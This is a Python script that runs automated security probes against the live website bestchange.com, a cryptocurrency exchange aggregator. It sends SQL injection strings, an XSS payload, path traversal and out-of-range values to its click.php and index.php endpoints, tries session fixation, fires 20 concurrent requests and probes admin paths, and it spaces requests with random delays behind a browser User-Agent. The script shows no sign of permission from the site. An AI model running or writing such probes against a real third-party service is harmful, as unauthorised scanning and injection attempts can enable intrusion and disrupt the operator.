#!/usr/bin/env python3
"""
BestChange.com Business Logic Testing
Testing for business logic flaws and workflow vulnerabilities
"""

import requests
import time
import random
import re

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

class BusinessLogicTests:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.session.timeout = 10
    
    def random_delay(self, min_sec=0.3, max_sec=1.0):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        self.findings.append({
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity
        })
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.CYAN
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    {location}: {details}\n")
    
    def test_currency_manipulation(self):
        """Test if currency exchange rates can be manipulated"""
        print(f"{Colors.BLUE}[*] Testing currency rate manipulation...{Colors.RESET}")
        
        # Try to manipulate currency parameters
        test_cases = [
            {'from': 'bitcoin', 'to': 'tether-trc20', 'amount': -1000},
            {'from': 'bitcoin', 'to': 'tether-trc20', 'amount': 0},
            {'from': 'bitcoin', 'to': 'tether-trc20', 'amount': 999999999},
            {'from': '', 'to': 'tether-trc20'},
            {'from': 'bitcoin', 'to': ''},
        ]
        
        for test_case in test_cases:
            try:
                url = f"{self.base_url}/index.php"
                response = self.session.get(url, params=test_case, timeout=5)
                self.random_delay()
                
                # Check for error handling
                if 'error' in response.text.lower() and len(response.text) < 500:
                    # Good error handling
                    pass
                elif 'rate' in response.text.lower() and ('-1000' in response.text or '999999999' in response.text):
                    self.log_finding(
                        "Potential Rate Manipulation",
                        "index.php",
                        f"Accepts invalid amounts: {test_case}",
                        "MEDIUM"
                    )
            except:
                continue
    
    def test_exchanger_id_manipulation(self):
        """Test exchanger ID manipulation"""
        print(f"{Colors.BLUE}[*] Testing exchanger ID manipulation...{Colors.RESET}")
        
        # Test various ID values
        test_ids = [
            -1, 0, 1, 999, 9999, 99999,
            'admin', '../', '../../',
            "1' OR '1'='1", "1 UNION SELECT NULL",
        ]
        
        for test_id in test_ids:
            try:
                url = f"{self.base_url}/click.php"
                params = {'id': test_id, 'from': 10, 'to': 58, 'city': 0}
                response = self.session.get(url, params=params, timeout=5)
                self.random_delay()
                
                # Check response
                if response.status_code == 200:
                    # Check if we get redirected or get exchanger info
                    if 'exchanger' in response.text.lower() or 'redirect' in response.headers.get('Location', '').lower():
                        if isinstance(test_id, int) and test_id < 0:
                            self.log_finding(
                                "Exchanger ID Validation",
                                "click.php",
                                f"Accepts negative ID: {test_id}",
                                "LOW"
                            )
            except:
                continue
    
    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing session fixation...{Colors.RESET}")
        
        try:
            # Get initial session
            response1 = self.session.get(f"{self.base_url}/")
            session1 = self.session.cookies.get('PHPSESSID', '')
            
            # Create new session
            new_session = requests.Session()
            new_session.headers.update(self.session.headers)
            
            # Try to set session ID
            if session1:
                new_session.cookies.set('PHPSESSID', session1)
                response2 = new_session.get(f"{self.base_url}/")
                session2 = new_session.cookies.get('PHPSESSID', '')
                
                # Check if session was regenerated
                if session2 == session1:
                    self.log_finding(
                        "Potential Session Fixation",
                        "Session Management",
                        "Session ID not regenerated on login",
                        "MEDIUM"
                    )
        except:
            pass
    
    def test_concurrent_operations(self):
        """Test concurrent operations for race conditions"""
        print(f"{Colors.BLUE}[*] Testing concurrent operations...{Colors.RESET}")
        
        import threading
        
        results = []
        errors = []
        
        def concurrent_request():
            try:
                url = f"{self.base_url}/click.php"
                params = {'id': 1, 'from': 10, 'to': 58, 'city': 0}
                response = self.session.get(url, params=params, timeout=5)
                results.append({
                    'status': response.status_code,
                    'length': len(response.text),
                    'headers': dict(response.headers)
                })
            except Exception as e:
                errors.append(str(e))
        
        # Launch 20 concurrent requests
        threads = []
        for i in range(20):
            t = threading.Thread(target=concurrent_request)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # Analyze results
        if results:
            status_codes = [r['status'] for r in results]
            unique_statuses = set(status_codes)
            
            if len(unique_statuses) > 2:
                self.log_finding(
                    "Inconsistent Concurrent Responses",
                    "click.php",
                    f"Multiple status codes: {unique_statuses}",
                    "MEDIUM"
                )
            
            # Check response length variance
            lengths = [r['length'] for r in results]
            if lengths:
                length_variance = max(lengths) - min(lengths)
                if length_variance > 1000:  # Significant variance
                    self.log_finding(
                        "Response Length Variance",
                        "click.php",
                        f"Response length varies: {min(lengths)}-{max(lengths)} bytes",
                        "LOW"
                    )
    
    def test_input_validation(self):
        """Test input validation across endpoints"""
        print(f"{Colors.BLUE}[*] Testing input validation...{Colors.RESET}")
        
        # Test various input types
        test_inputs = [
            ('string', 'test'),
            ('integer', 123),
            ('negative', -1),
            ('zero', 0),
            ('large', 999999999),
            ('float', 123.456),
            ('special', '../'),
            ('sql', "1' OR '1'='1"),
            ('xss', '<script>alert(1)</script>'),
            ('null', None),
            ('empty', ''),
        ]
        
        endpoints = [
            ('click.php', {'id': '1', 'from': '10', 'to': '58', 'city': '0'}),
            ('index.php', {'mt': 'rates'}),
        ]
        
        for endpoint, base_params in endpoints:
            for param_name in base_params.keys():
                for input_type, input_value in test_inputs[:5]:  # Test subset
                    try:
                        test_params = base_params.copy()
                        test_params[param_name] = input_value
                        
                        url = f"{self.base_url}/{endpoint}"
                        response = self.session.get(url, params=test_params, timeout=5)
                        self.random_delay()
                        
                        # Check if invalid input is accepted
                        if response.status_code == 200:
                            if input_type in ['negative', 'special', 'sql', 'xss']:
                                # Check if input is reflected or processed
                                if str(input_value) in response.text or response.text.lower().count('error') == 0:
                                    self.log_finding(
                                        "Input Validation",
                                        f"{endpoint}?{param_name}",
                                        f"Accepts {input_type} input: {input_value}",
                                        "MEDIUM"
                                    )
                    except:
                        continue
    
    def test_authorization_bypass(self):
        """Test for authorization bypass"""
        print(f"{Colors.BLUE}[*] Testing authorization bypass...{Colors.RESET}")
        
        # Test accessing admin/private endpoints without auth
        admin_paths = [
            '/admin',
            '/admin.php',
            '/administrator',
            '/panel',
            '/dashboard',
            '/manage',
            '/control',
        ]
        
        for path in admin_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=5, allow_redirects=False)
                self.random_delay()
                
                if response.status_code == 200:
                    # Check if it's actually an admin page
                    admin_indicators = ['admin', 'dashboard', 'panel', 'manage', 'control', 'settings']
                    if any(indicator in response.text.lower() for indicator in admin_indicators):
                        self.log_finding(
                            "Potential Authorization Bypass",
                            url,
                            "Admin endpoint accessible without authentication",
                            "HIGH"
                        )
            except:
                continue
    
    def generate_report(self):
        """Generate report"""
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}BUSINESS LOGIC TEST REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No business logic vulnerabilities found{Colors.RESET}")
        else:
            high = [f for f in self.findings if f['severity'] == 'HIGH']
            medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
            low = [f for f in self.findings if f['severity'] == 'LOW']
            
            print(f"{Colors.RED}[!] Found {len(self.findings)} finding(s){Colors.RESET}")
            print(f"  HIGH: {len(high)}, MEDIUM: {len(medium)}, LOW: {len(low)}\n")
            
            for finding in self.findings:
                color = Colors.RED if finding['severity'] == 'HIGH' else Colors.YELLOW if finding['severity'] == 'MEDIUM' else Colors.CYAN
                print(f"{color}[{finding['severity']}] {finding['type']}{Colors.RESET}")
                print(f"    {finding['location']}: {finding['details']}\n")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Business Logic Tests{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    tester = BusinessLogicTests()
    
    try:
        tester.test_currency_manipulation()
        tester.test_exchanger_id_manipulation()
        tester.test_session_fixation()
        tester.test_concurrent_operations()
        tester.test_input_validation()
        tester.test_authorization_bypass()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
    
    tester.generate_report()

if __name__ == "__main__":
    main()
